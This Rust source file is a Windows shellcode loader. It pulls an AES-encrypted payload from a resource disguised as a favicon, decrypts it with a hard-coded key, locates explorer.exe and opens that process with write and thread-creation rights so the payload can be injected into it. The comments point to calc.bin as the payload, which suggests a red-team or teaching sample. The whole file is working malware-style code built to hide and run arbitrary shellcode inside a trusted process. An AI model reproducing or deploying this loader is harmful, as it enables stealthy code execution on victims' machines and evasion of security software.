#![allow(non_snake_case)]
mod aes;
mod find_target;
mod inject;
use std::ptr;
use winapi::{
    shared::minwindef::{FALSE, HGLOBAL, HRSRC},
    um::{
        handleapi::CloseHandle,
        libloaderapi::{LoadResource, LockResource, SizeofResource},
        memoryapi::VirtualAlloc,
        processthreadsapi::OpenProcess,
        winbase::FindResourceA,
        winnt::{
            MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PROCESS_CREATE_THREAD,
            PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
        },
        winuser,
    },
};

const FAVICON_ICO: u16 = 100;
fn main() {
    // Get key and payload by running aesencrypt.py
    // python.exe .\aesencrypt.py calc.bin
    let key: &[u8] = &[
        0x3a, 0x49, 0x52, 0x80, 0xfe, 0xf5, 0xf6, 0xc4, 0xe6, 0x9c, 0x4e, 0x8, 0xfc, 0x7c, 0x5, 0x3,
    ];

    // Get payload from resources
    let res: HRSRC = unsafe {
        FindResourceA(
            ptr::null_mut(),
            FAVICON_ICO as _,
            winuser::RT_RCDATA as *const i8,
        )
    };
    // Load the resource
    let res_handle: HGLOBAL = unsafe { LoadResource(ptr::null_mut(), res) };
    let payload = unsafe { LockResource(res_handle) as *mut u8 };
    let payload_len = unsafe { SizeofResource(ptr::null_mut(), res) } as usize;

    // Allocate memory for the payload
    let exec_mem: *mut u8;
    unsafe {
        exec_mem = VirtualAlloc(
            ptr::null_mut(),
            payload_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        ) as *mut u8;
    }

    #[cfg(debug_assertions)]
    {
        println!("{:<20} : {:p}", "payload addr", payload);
        println!("{:<20} : {:p}", "exec_mem addr", exec_mem);

        println!("\nHit me 1st!\n");
        std::io::stdin().read_line(&mut String::new()).unwrap();
    }

    // Decrypt the payload
    let mut decrypted_payload = vec![0u8; payload_len];

    // This line copies the original payload to a new memory buffer, `decrypted_payload`.
    // It takes the source pointer (payload), the destination pointer (decrypted_payload.as_mut_ptr()),
    // and the number of bytes to copy (payload_len).
    unsafe {
        ptr::copy_nonoverlapping(payload, decrypted_payload.as_mut_ptr(), payload_len);
    }

    // This line calls the `aes_decrypt` function, which takes a mutable reference to the `decrypted_payload` buffer
    // and the AES key. The decryption is done in-place, modifying the `decrypted_payload` buffer.
    aes::aes_decrypt(&mut decrypted_payload, key);

    // This line copies the decrypted payload to a new memory buffer, `exec_mem`.
    // It takes the source pointer (decrypted_payload.as_ptr()), the destination pointer (exec_mem),
    // and the number of bytes to copy (payload_len).
    unsafe {
        ptr::copy_nonoverlapping(decrypted_payload.as_ptr(), exec_mem, payload_len);
    }

    // Find target process
    let pid = find_target::find_target("explorer.exe");

    // If pid is not 0, inject payload into target process
    if pid != 0 {
        // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        let h_proc = unsafe {
            OpenProcess(
                PROCESS_CREATE_THREAD
                    | PROCESS_QUERY_INFORMATION
                    | PROCESS_VM_OPERATION
                    | PROCESS_VM_READ
                    | PROCESS_VM_WRITE,
                FALSE,
                pid,
            )
        };

        // If h_proc is not null, inject payload into target process
        if !h_proc.is_null() {
            inject::inject(h_proc, &decrypted_payload, payload_len);
            unsafe { CloseHandle(h_proc) };
        }
    }
}
